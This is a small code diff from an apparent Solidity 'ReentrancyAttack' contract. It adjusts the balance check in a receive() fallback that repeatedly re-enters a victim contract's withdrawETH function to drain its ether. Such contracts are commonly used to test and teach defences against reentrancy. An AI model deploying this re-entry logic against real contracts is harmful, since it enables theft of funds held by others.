@@ -23,7 +23,7 @@ contract ReentrancyAttack {
     }
 
     receive() external payable {
-        if (address(Victim).balance > 1 ether) {
+        if (address(Victim).balance >= 1 ether) {
             Victim.withdrawETH(1 ether);
         }
     }
